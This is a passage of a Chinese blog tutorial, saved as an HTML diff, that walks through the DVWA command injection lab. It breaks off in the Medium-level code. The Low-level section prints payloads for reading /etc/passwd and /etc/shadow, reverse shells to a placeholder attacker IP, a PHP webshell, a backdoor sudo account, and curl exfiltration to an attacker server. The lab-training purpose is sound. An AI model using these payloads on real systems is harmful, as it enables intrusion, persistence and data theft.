@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html lang="en,zh-CN,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/undefined/pace/pace-theme-pace-theme-center-atom.min.css">
+  <script src="/undefined/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"caixuya.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"B5HBQCBE1B","apiKey":"ea181e93e7b10c0d94c8e758b7eb25ab","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"输入关键字","hits_empty":"没有找到与「${query}」相关的内容","hits_stats":"${hits}条相关记录，共耗时 ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是命令注入（Command Injection）？命令注入是指攻击者在应用程序中注入操作系统命令，使应用程序执行预期之外的系统命令。 原理：应用程序将用户输入直接传递给系统shell执行，没有进行适当的过滤和验证。 危害：  读取敏感文件（&#x2F;etc&#x2F;passw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA - Command Injection (命令注入) 攻防练习详解">
+<meta property="og:url" content="http://caixuya.github.io/2025/11/20/Command_Injection_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="tia的学习笔记">
+<meta property="og:description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是命令注入（Command Injection）？命令注入是指攻击者在应用程序中注入操作系统命令，使应用程序执行预期之外的系统命令。 原理：应用程序将用户输入直接传递给系统shell执行，没有进行适当的过滤和验证。 危害：  读取敏感文件（&#x2F;etc&#x2F;passw">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-20T15:31:37.093Z">
+<meta property="article:modified_time" content="2025-11-20T15:25:08.648Z">
+<meta property="article:author" content="caixuya">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://caixuya.github.io/2025/11/20/Command_Injection_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DVWA - Command Injection (命令注入) 攻防练习详解 | tia的学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="tia的学习笔记" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tia的学习笔记</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-目录">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>目录</a>
+
+  </li>
+        <li class="menu-item menu-item-站点地图">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-开往">
+
+    <a href="/travelling/" rel="section"><i class="fa fa-paper-plane fa-fw"></i>开往</a>
+
+  </li>
+        <li class="menu-item menu-item-给我写信">
+
+    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=vY_MiY2FhI2Ojf3MzJPe0tA" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>给我写信</a>
+
+  </li>
+        <li class="menu-item menu-item-公益404">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/Command_Injection_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="caixuya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tia的学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA - Command Injection (命令注入) 攻防练习详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:25:08" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
+<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
+<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
+<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
+<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
+</ul>
+<hr>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是命令注入（Command-Injection）？"><a href="#什么是命令注入（Command-Injection）？" class="headerlink" title="什么是命令注入（Command Injection）？"></a>什么是命令注入（Command Injection）？</h3><p>命令注入是指攻击者在应用程序中注入操作系统命令，使应用程序执行预期之外的系统命令。</p>
+<p><strong>原理：</strong><br>应用程序将用户输入直接传递给系统shell执行，没有进行适当的过滤和验证。</p>
+<p><strong>危害：</strong></p>
+<ul>
+<li>读取敏感文件（&#x2F;etc&#x2F;passwd、配置文件）</li>
+<li>修改系统文件</li>
+<li>执行任意命令</li>
+<li>反弹shell获取服务器控制权</li>
+<li>提权</li>
+<li>植入后门</li>
+</ul>
+<p><strong>常见场景：</strong></p>
+<ul>
+<li>Ping工具</li>
+<li>DNS查询工具</li>
+<li>文件处理工具</li>
+<li>系统管理工具</li>
+</ul>
+<hr>
+<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>无任何过滤的命令执行，完全暴露。</p>
+<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了表单</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否已设置</span></span><br><span class="line"><span class="comment">// $_POST[&#x27;Submit&#x27;] - 检查Submit按钮是否被点击</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入的目标IP地址</span></span><br><span class="line">    <span class="comment">// $_REQUEST - 包含$_GET、$_POST、$_COOKIE的超全局数组</span></span><br><span class="line">    <span class="comment">// trim() - 移除字符串两端的空白字符（空格、制表符、换行符等）</span></span><br><span class="line">    <span class="comment">// 作用：清理用户输入前后的空格</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接拼接用户输入到系统命令 ★★★</span></span><br><span class="line">    <span class="comment">// 判断操作系统类型</span></span><br><span class="line">    <span class="comment">// stristr() - 不区分大小写的查找子字符串</span></span><br><span class="line">    <span class="comment">// PHP_OS - PHP预定义常量，返回操作系统名称（如：Windows NT、Linux）</span></span><br><span class="line">    <span class="comment">// &#x27;WIN&#x27; - 检查是否为Windows系统</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ Windows系统：执行ping命令 ★★★</span></span><br><span class="line">        <span class="comment">// shell_exec() - 通过shell执行命令并返回输出</span></span><br><span class="line">        <span class="comment">// &quot;ping -n 4 &quot; - Windows的ping命令，-n 4表示发送4个数据包</span></span><br><span class="line">        <span class="comment">// . $target - 字符串连接运算符，将用户输入直接拼接到命令中</span></span><br><span class="line">        <span class="comment">// 问题：没有任何过滤！用户可以注入任意命令！</span></span><br><span class="line">        <span class="comment">// 示例危险输入：127.0.0.1 &amp; dir</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ Linux/Unix系统：执行ping命令 ★★★</span></span><br><span class="line">        <span class="comment">// ping -c 4 - Linux的ping命令，-c 4表示发送4个数据包</span></span><br><span class="line">        <span class="comment">// 问题：同样没有任何过滤！</span></span><br><span class="line">        <span class="comment">// 示例危险输入：127.0.0.1; ls -la</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将命令执行结果存储到HTML变量中</span></span><br><span class="line">    <span class="comment">// &lt;pre&gt; - HTML预格式化标签，保留空格和换行</span></span><br><span class="line">    <span class="comment">// &#123;$cmd&#125; - 在双引号字符串中插入变量值</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>直接拼接用户输入</strong> - 没有任何验证或过滤</li>
+<li><strong>使用shell_exec()</strong> - 直接执行shell命令</li>
+<li><strong>无输入验证</strong> - 不检查IP格式</li>
+<li><strong>无黑名单</strong> - 允许任何特殊字符</li>
+</ol>
+<p><strong>命令连接符：</strong></p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>系统</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>;</code></td>
+<td>Linux&#x2F;Win</td>
+<td>依次执行</td>
+<td><code>127.0.0.1; ls</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>Windows</td>
+<td>依次执行</td>
+<td><code>127.0.0.1 &amp; dir</code></td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>Linux&#x2F;Win</td>
+<td>前者成功才执行后者</td>
+<td><code>127.0.0.1 &amp;&amp; whoami</code></td>
+</tr>
+<tr>
+<td><code>|</code></td>
+<td>Linux&#x2F;Win</td>
+<td>管道，前者输出作为后者输入</td>
+<td><code>127.0.0.1 | cat /etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>||</code></td>
+<td>Linux&#x2F;Win</td>
+<td>前者失败才执行后者</td>
+<td><code>invalid || whoami</code></td>
+</tr>
+<tr>
+<td><code>`command`</code></td>
+<td>Linux</td>
+<td>命令替换</td>
+<td><code>127.0.0.1 `whoami` </code></td>
+</tr>
+<tr>
+<td><code>$(command)</code></td>
+<td>Linux</td>
+<td>命令替换</td>
+<td><code>127.0.0.1 $(ls)</code></td>
+</tr>
+</tbody></table>
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="基础测试"><a href="#基础测试" class="headerlink" title="基础测试"></a>基础测试</h4><p><strong>1. 简单命令注入（Linux）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：</span></span><br><span class="line">127.0.0.1; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行的实际命令：</span></span><br><span class="line">ping -c 4 127.0.0.1; <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：先ping，然后显示当前用户</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 查看目录（Linux）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：</span></span><br><span class="line">127.0.0.1; <span class="built_in">ls</span> -la</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看系统信息</span></span><br><span class="line">127.0.0.1; <span class="built_in">uname</span> -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前路径</span></span><br><span class="line">127.0.0.1; <span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 读取敏感文件（Linux）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取密码文件</span></span><br><span class="line">127.0.0.1; <span class="built_in">cat</span> /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取shadow文件（需要权限）</span></span><br><span class="line">127.0.0.1; <span class="built_in">cat</span> /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取PHP配置</span></span><br><span class="line">127.0.0.1; <span class="built_in">cat</span> ../../config/config.inc.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. Windows命令</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">REM 查看目录</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; <span class="built_in">dir</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 查看当前用户</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; whoami</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 查看系统信息</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; systeminfo</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 查看网络配置</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> &amp; <span class="built_in">ipconfig</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="高级攻击"><a href="#高级攻击" class="headerlink" title="高级攻击"></a>高级攻击</h4><p><strong>1. 反弹Shell（Linux）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1：使用netcat</span></span><br><span class="line">127.0.0.1; nc -e /bin/bash 攻击者IP 4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：使用bash</span></span><br><span class="line">127.0.0.1; bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3：使用python</span></span><br><span class="line">127.0.0.1; python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击者IP&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击者监听：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在攻击者机器上监听</span></span><br><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 写入WebShell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入PHP一句话木马</span></span><br><span class="line">127.0.0.1; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; /var/www/html/shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问：</span></span><br><span class="line">http://dvwa.local/shell.php?cmd=<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 添加管理员账户（Linux）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">127.0.0.1; useradd -m hacker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置密码</span></span><br><span class="line">127.0.0.1; <span class="built_in">echo</span> <span class="string">&#x27;hacker:password&#x27;</span> | chpasswd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加到sudo组</span></span><br><span class="line">127.0.0.1; usermod -aG sudo hacker</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 数据窃取</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 压缩敏感目录</span></span><br><span class="line">127.0.0.1; tar -czf /tmp/data.tar.gz /var/www/html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过网络传输</span></span><br><span class="line">127.0.0.1; curl -F <span class="string">&quot;file=@/tmp/data.tar.gz&quot;</span> http://攻击者服务器/upload</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用Burp-Suite"><a href="#使用Burp-Suite" class="headerlink" title="使用Burp Suite"></a>使用Burp Suite</h4><p><strong>步骤：</strong></p>
+<ol>
+<li>开启Burp Suite代理</li>
+<li>提交正常请求</li>
+<li>在Burp中拦截请求</li>
+<li>修改ip参数：<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ip</span><span class="operator">=</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="comment">; cat /etc/passwd</span></span><br></pre></td></tr></table></figure></li>
+<li>Forward请求</li>
+<li>查看响应</li>
+</ol>
+<hr>
+<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了黑名单过滤，但可以绕过。</p>
+<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：黑名单过滤 ★★★</span></span><br><span class="line">    <span class="comment">// 定义要过滤的特殊字符数组</span></span><br><span class="line">    <span class="comment">// 这些是常用的命令连接符</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,  <span class="comment">// 逻辑与，前者成功才执行后者</span></span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,  <span class="comment">// 命令分隔符，依次执行</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// str_replace() - 字符串替换函数</span></span><br><span class="line">    <span class="comment">// 参数1：要查找的字符（数组）</span></span><br><span class="line">    <span class="comment">// 参数2：替换成的字符（数组）</span></span><br><span class="line">    <span class="comment">// 参数3：被搜索的字符串</span></span><br><span class="line">    <span class="comment">// 返回值：替换后的字符串</span></span><br><span class="line">    <span class="comment">// array_keys() - 返回数组的所有键（这里是&#x27;&amp;&amp;&#x27;和&#x27;;&#x27;）</span></span><br><span class="line">    <span class="comment">// array_values() - 返回数组的所有值（这里都是空字符串&#x27;&#x27;）</span></span><br><span class="line">    <span class="comment">// 作用：将&amp;&amp;和;替换为空，试图阻止命令注入</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行ping命令</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span 